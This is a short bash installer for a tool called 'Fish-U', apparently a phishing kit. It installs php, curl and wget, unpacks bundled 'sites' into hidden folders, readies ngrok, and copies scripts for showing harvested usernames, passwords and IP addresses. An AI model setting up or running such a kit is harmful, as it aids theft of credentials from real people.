#!/bin/bash

#Pre Requirements installation
## Dependencies

apt install php -y
apt install curl -y
apt install wget -y
apt install unzip -y
apt install figlet
 




#Setup Aliases
cd utilities
chmod +x *
./Aliases.sh
cd ..



#executable permission provider
cd ui
chmod +x *
cd ..

#For Main Script
cd core
chmod +x *
cp fish-u.sh $HOME
cd ..

#For Update
cd utilities
cp update-fish-u.sh $HOME
cd


cd 
cd Fish-U
cp server.zip $HOME/Fish-U/core



cd core
unzip server.zip
mv server .server
mv sites .sites
mv git .git
cd .server
chmod +x ngrok



#Show Username_Password & ip.

cd
cd Fish-U
cd utilities
chmod +x *
cp show-ips.sh $HOME
cp show-credentials.sh $HOME



#Spinner
Green="\e[92m"
printf "${Green}"


spinner=( 'Fish-U' 'WLS-SD');

#spinner=( '|' '/' '-' '\' );

count(){
  spin &
  pid=$!
  for i in `seq 1 6`

  do
    sleep 0.6;
  done

  kill $pid
}

spin(){
  while [ 1 ]
  do
    for i in ${spinner[@]};
    do
      echo -ne "\r$i";
      sleep 0.6;
    done;
  done
}
count
